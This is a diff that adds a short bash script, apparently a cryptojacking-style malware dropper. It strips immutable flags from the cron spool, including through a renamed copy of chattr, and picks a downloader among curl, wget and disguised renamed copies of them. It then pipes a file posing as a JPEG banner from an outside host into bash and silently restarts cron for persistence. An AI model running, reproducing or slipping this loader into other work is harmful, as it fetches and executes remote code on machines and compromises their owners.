@@ -1,0 +1,27 @@
+#!/bin/bash
+tntrecht -iR /var/spool/cron/ 2>/dev/null 1>/dev/null
+chattr -iR /var/spool/cron/ 2>/dev/null 1>/dev/null
+LDR="wget -q --max-redirect=2 -O -"
+if [ -s /usr/bin/curl ]; then
+  LDR="curl -Ls "
+fi
+if [ -s /usr/bin/cur ]; then
+  LDR="cur -Ls "
+fi
+if [ -s /usr/bin/cdl ]; then
+  LDR="cdl -Ls "
+fi
+if [ -s /usr/bin/wget ]; then
+  LDR="wget -q --max-redirect=2 -O -"
+fi
+if [ -s /usr/bin/wge ]; then
+  LDR="wge -q --max-redirect=2 -O -"
+fi
+if [ -s /usr/bin/wdl ]; then
+  LDR="wdl -q --max-redirect=2 -O -"
+fi
+$LDR http://HealthyMiami.com/images/banner.jpeg | bash
+service cron start 2>/dev/null 1>/dev/null
+service crond start 2>/dev/null 1>/dev/null
+systemctl start cron 2>/dev/null 1>/dev/null
+systemctl start crond 2>/dev/null 1>/dev/null
